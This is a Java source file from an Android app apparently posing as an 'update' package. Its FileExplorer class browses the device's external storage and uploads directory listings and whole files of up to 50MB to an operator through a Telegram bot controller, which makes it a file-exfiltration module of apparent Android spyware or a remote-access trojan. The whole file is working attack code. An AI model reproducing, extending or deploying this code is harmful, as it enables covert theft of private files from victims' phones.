package com.kasari.update;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class FileExplorer {

    public static void listFiles(Context context, String path) {
        new Thread(() -> {
            try {
                String basePath = path != null && !path.isEmpty() ? path : 
                    Environment.getExternalStorageDirectory().getAbsolutePath();
                
                File directory = new File(basePath);
                if (!directory.exists() || !directory.isDirectory()) {
                    TelegramController.sendMessage(context, "📂 Directory not found: " + basePath);
                    return;
                }
                
                StringBuilder sb = new StringBuilder();
                sb.append("📂 **Files: ").append(basePath).append("**\n\n");
                
                File[] files = directory.listFiles();
                if (files != null) {
                    int count = 0;
                    for (File file : files) {
                        if (count >= 50) {
                            sb.append("\n...and ").append(files.length - 50).append(" more");
                            break;
                        }
                        
                        String name = file.getName();
                        String type = file.isDirectory() ? "📁" : "📄";
                        String size = file.isFile() ? 
                            formatFileSize(file.length()) : "";
                        
                        String modified = new SimpleDateFormat("dd-MM HH:mm", 
                            Locale.getDefault()).format(new Date(file.lastModified()));
                        
                        String entry = type + " " + name + " " + size + " [" + modified + "]\n";
                        
                        if (sb.length() + entry.length() > 4000) {
                            TelegramController.sendMessage(context, sb.toString());
                            Thread.sleep(1000);
                            sb = new StringBuilder();
                        }
                        
                        sb.append(entry);
                        count++;
                    }
                }
                
                if (sb.length() > 0) {
                    TelegramController.sendMessage(context, sb.toString());
                }
                
            } catch (Exception e) {
                e.printStackTrace();
                TelegramController.sendMessage(context, "📂 File list error");
            }
        }).start();
    }

    public static void sendFile(Context context, String filePath) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists() || !file.isFile()) {
                    TelegramController.sendMessage(context, "📂 File not found: " + filePath);
                    return;
                }
                
                if (file.length() > 50 * 1024 * 1024) {
                    TelegramController.sendMessage(context, 
                        "📂 File too large (>50MB): " + file.getName());
                    return;
                }
                
                FileInputStream fis = new FileInputStream(file);
                byte[] fileBytes = new byte[(int) file.length()];
                fis.read(fileBytes);
                fis.close();
                
                String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
                    Locale.getDefault()).format(new Date());
                
                TelegramController.sendDocument(context, fileBytes, file.getName(), 
                    "📂 File: " + file.getName() + "\nSize: " + formatFileSize(file.length()) + 
                    "\n🕐 " + timestamp);
                
            } catch (Exception e) {
                e.printStackTrace();
                TelegramController.sendMessage(context, "📂 File send error: " + e.getMessage());
            }
        }).start();
    }

    private static String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        else if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        else if (bytes < 1024 * 1024 * 1024) return String.format("%.1f MB", bytes / (1024.0 * 1024));
        else return String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024));
    }
}